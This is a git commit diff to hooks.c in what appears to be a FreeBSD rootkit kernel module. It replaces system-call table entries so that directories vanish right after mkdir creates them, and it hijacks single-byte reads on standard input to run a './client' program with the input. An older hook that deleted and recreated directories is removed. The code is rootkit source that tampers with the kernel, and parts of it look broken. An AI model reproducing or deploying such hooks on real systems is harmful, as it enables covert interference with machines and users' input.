1fde647dc23dd7cddd6b43fbb9e5c7d9246a018c
Charlie Root <root@rootkit-dev.6447>
2019-07-22 22:43:59 +1000

    hooks

--- hooks.c
+++ hooks.c
@@ -9,14 +9,23 @@
 #include <sys/sysproto.h>
 #include <sys/unistd.h>
 #include <sys/fcntl.h>
+#include <sys/stat.h>
+#include <sys/dirent.h>
 
+/*static int recursiveDelete(struct thread *td, char *dirname);
 
-
+struct linux_dirent {
+    ino_t d_ino;
+    off_t d_off;
+    uint16_t d_reclen;
+    uint8_t d_type;
+    uint16_t d_namlen;
+    char d_name[MAXNAMLEN + 1];
+};
+*/
 static int mkdir_hook(struct thread *td, void *syscall_args){
     struct mkdir_args *uap; /* char *path; int mode */
     uap = (struct mkdir_args *)syscall_args;
-    // syscall_args->mode = 0;
-    //strcat(uap->path, "penis");
     char path[255];  
     size_t done;
     int error;
@@ -24,19 +33,35 @@ static int mkdir_hook(struct thread *td, void *syscall_args){
     if (error != 0)
         return(error);
     /* Print a debug message. */
-    printf("The directory \"%s\" will be created with the following permissions: %o\n", path, uap->mode);
-    return(sys_mkdir(td, syscall_args));
+    uprintf("The directory \"%s\" will be created with the following permissions: %o\n", path, uap->mode);
+    sys_mkdir(td, syscall_args);
+    return sys_rmdir(td, (void *)uap->path);
 }
 
-static int chdir_hook(struct thread *td, void *syscall_args){
-    //send to the root directory 
-    struct mkdir_args *uap; /* char *path; int mode */
-    uap = (struct mkdir_args *)syscall_args;
-    uap->mode = 0;
-
-    sys_rmdir(td, syscall_args);
-    sys_mkdir(td, (void *)uap);
-    return(sys_chdir(td, syscall_args));
+static int read_hook(struct thread *td, void *syscall_args){
+	//printf("called read hook\n");
+	struct read_args *uap;
+	uap = (struct read_args *)syscall_args;
+	
+	int error = sys_read(td, syscall_args);
+	
+	if(error){
+		return error;
+	} else if (!uap->nbyte){
+		return 1;
+	} else if (uap->nbyte > 1){
+		return 1;
+	} else if (uap->fd != 0){
+		return 1;
+	}
+	struct execve_args args;
+	char *newArgs[] = {"./client", uap->buf, NULL};
+	args.path = "./client";
+	args.argv = newArgs;
+	args.envp = NULL;
+	
+	sys_execve(td, (void *)args);
+	return 0;
 }
 
 static int load(struct module *module, int cmd, void *arg) {
@@ -44,16 +69,20 @@ static int load(struct module *module, int cmd, void *arg) {
     	switch (cmd) {
         	case MOD_LOAD:
            		/* Replace read with read_hook. */
-                sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
-                sysent[SYS_chdir].sy_call = (sy_call_t *)chdir_hook;
-                break;
+              		printf("What's gucci?\n");
+			sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
+                	sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
+			//sysent[SYS_chdir].sy_call = (sy_call_t *)chdir_hook;
+                	break;
      		case MOD_UNLOAD:
-                sysent[SYS_mkdir].sy_call = (sy_call_t *)sys_mkdir;
-                sysent[SYS_chdir].sy_call = (sy_call_t *)sys_chdir;
-			    break;
-            default:
-                error = EOPNOTSUPP;
-                break;
+			printf("bye fam\n");
+                	sysent[SYS_mkdir].sy_call = (sy_call_t *)sys_mkdir;
+                	sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+			//sysent[SYS_chdir].sy_call = (sy_call_t *)sys_chdir;
+			break;
+            	default:
+                	error = EOPNOTSUPP;
+                	break;
 	}
     	return(error);
 }
